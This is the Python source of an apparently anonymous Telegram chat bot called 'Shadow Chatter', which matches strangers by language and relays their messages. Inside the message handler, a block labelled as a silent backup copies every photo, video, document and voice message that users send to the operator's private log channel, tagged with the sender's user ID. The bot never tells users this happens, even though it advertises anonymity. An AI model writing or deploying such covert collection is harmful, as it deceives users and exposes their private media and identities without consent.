import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, Router, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.types import BotCommand, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from pymongo import AsyncMongoClient

# Environment Variables
TOKEN = os.environ.get("BOT_TOKEN")
MONGO_URI = os.environ.get("MONGO_URI")
# Add this to Render! Your private channel ID for cloud storage
LOG_CHANNEL_ID = os.environ.get("LOG_CHANNEL_ID") 

logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()

client = AsyncMongoClient(MONGO_URI)
db = client.anon_chat_db
queue_col = db.queue
chats_col = db.active_chats
users_col = db.users # New collection to remember user preferences

# --- UI COMPONENTS ---

def get_language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_english")],
        [InlineKeyboardButton(text="🇮🇳 Tamil", callback_data="lang_tamil")],
        [InlineKeyboardButton(text="🌍 Global (Any)", callback_data="lang_global")]
    ])

def get_chat_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⏭ Next Partner", callback_data="action_next")],
        [InlineKeyboardButton(text="🛑 Stop", callback_data="action_stop")]
    ])

async def set_bot_commands(bot: Bot):
    commands = [
        BotCommand(command="start", description="Start and set language"),
        BotCommand(command="search", description="Find a partner"),
        BotCommand(command="next", description="Skip to next partner"),
        BotCommand(command="stop", description="End chat")
    ]
    await bot.set_my_commands(commands)

# --- COMMAND HANDLERS ---

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    gif_url = "https://media.giphy.com/media/l41lFw057lAJQMwg0/giphy.gif"
    await message.answer_animation(
        animation=gif_url,
        caption="<b>Welcome to Shadow Chatter!</b> 🕵️‍♂️\n\nPlease select your preferred chat language. We will try to match you with someone speaking the same language first.",
        reply_markup=get_language_keyboard()
    )

@router.callback_query(F.data.startswith("lang_"))
async def set_language(callback: CallbackQuery):
    lang_choice = callback.data.split("_")[1]
    
    # Save user preference permanently in MongoDB
    await users_col.update_one(
        {"user_id": callback.from_user.id},
        {"$set": {"language": lang_choice}},
        upsert=True
    )
    
    await callback.message.edit_caption(
        caption=f"✅ Language set to <b>{lang_choice.title()}</b>!\n\nClick below to start.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔍 Find a Partner", callback_data="action_search")]
        ])
    )
    await callback.answer()

async def execute_search(user_id: int, chat_id: int):
    if await chats_col.find_one({"$or": [{"user_1": user_id}, {"user_2": user_id}]}):
        await bot.send_message(chat_id, "⚠️ You are already in a chat!", reply_markup=get_chat_keyboard())
        return
        
    if await queue_col.find_one({"user_id": user_id}):
        await bot.send_message(chat_id, "⏳ You are already in the waiting queue...")
        return

    # Get user's preferred language (default to global if not set)
    user_data = await users_col.find_one({"user_id": user_id})
    user_lang = user_data.get("language", "global") if user_data else "global"

    # SMART MATCH STEP 1: Try to find someone with the exact same language
    waiting_partner = await queue_col.find_one_and_delete({"user_id": {"$ne": user_id}, "language": user_lang})
    
    # SMART MATCH STEP 2: If nobody speaks that language right now, match with ANYONE waiting
    if not waiting_partner:
        waiting_partner = await queue_col.find_one_and_delete({"user_id": {"$ne": user_id}})

    if waiting_partner:
        partner_id = waiting_partner["user_id"]
        await chats_col.insert_one({"user_1": user_id, "user_2": partner_id})
        
        await bot.send_message(user_id, "✅ <b>Partner found!</b> Say Hi! 👋", reply_markup=get_chat_keyboard())
        await bot.send_message(partner_id, "✅ <b>Partner found!</b> Say Hi! 👋", reply_markup=get_chat_keyboard())
    else:
        await queue_col.insert_one({"user_id": user_id, "language": user_lang})
        await bot.send_message(chat_id, "⏳ Waiting for a partner...")

async def execute_stop(user_id: int, chat_id: int):
    deleted = await queue_col.find_one_and_delete({"user_id": user_id})
    if deleted:
        await bot.send_message(chat_id, "🛑 You left the waiting queue.")
        return
        
    chat = await chats_col.find_one_and_delete({"$or": [{"user_1": user_id}, {"user_2": user_id}]})
    if chat:
        partner_id = chat["user_2"] if chat["user_1"] == user_id else chat["user_1"]
        await bot.send_message(chat_id, "🛑 <b>You disconnected.</b>")
        try:
            await bot.send_message(partner_id, "🛑 <b>Your partner disconnected.</b>")
        except Exception:
            pass 
    else:
        await bot.send_message(chat_id, "⚠️ You are not in a chat.")

@router.message(Command("search"))
async def cmd_search(message: types.Message):
    await execute_search(message.from_user.id, message.chat.id)

@router.message(Command("stop"))
async def cmd_stop(message: types.Message):
    await execute_stop(message.from_user.id, message.chat.id)

@router.message(Command("next"))
async def cmd_next(message: types.Message):
    await execute_stop(message.from_user.id, message.chat.id)
    await execute_search(message.from_user.id, message.chat.id)

@router.callback_query(F.data == "action_search")
async def btn_search(callback: CallbackQuery):
    await callback.answer()
    await execute_search(callback.from_user.id, callback.message.chat.id)

@router.callback_query(F.data == "action_stop")
async def btn_stop(callback: CallbackQuery):
    await callback.answer()
    await execute_stop(callback.from_user.id, callback.message.chat.id)

@router.callback_query(F.data == "action_next")
async def btn_next(callback: CallbackQuery):
    await callback.answer()
    await execute_stop(callback.from_user.id, callback.message.chat.id)
    await execute_search(callback.from_user.id, callback.message.chat.id)

# --- MESSAGE ROUTING & CLOUD STORAGE ---

@router.message(~F.text.startswith('/'))
async def handle_message(message: types.Message):
    user_id = message.from_user.id
    chat = await chats_col.find_one({"$or": [{"user_1": user_id}, {"user_2": user_id}]})
    
    if chat:
        partner_id = chat["user_2"] if chat["user_1"] == user_id else chat["user_1"]
        try:
            # Forward to partner
            await bot.copy_message(
                chat_id=partner_id,
                from_chat_id=message.chat.id,
                message_id=message.message_id
            )
            
            # CLOUD STORAGE: Silently backup media/files to your private channel
            if LOG_CHANNEL_ID and (message.photo or message.video or message.document or message.voice):
                await bot.copy_message(
                    chat_id=LOG_CHANNEL_ID,
                    from_chat_id=message.chat.id,
                    message_id=message.message_id,
                    caption=f"Archived from User {user_id}"
                )
                
        except Exception as e:
            logging.error(f"Failed to send message: {e}")
            await message.answer("⚠ Failed to send message. Partner may have blocked the bot.")
            await chats_col.delete_one({"_id": chat["_id"]})
    else:
        await message.answer("⚠️ You are not connected to anyone. Type /search.")

# --- RENDER FREE TIER SERVER ---
async def ping(request):
    return web.Response(text="Bot is running!")

async def main():
    dp.include_router(router)
    await bot.delete_webhook(drop_pending_updates=True) 
    await set_bot_commands(bot)
    
    app = web.Application()
    app.router.add_get('/', ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
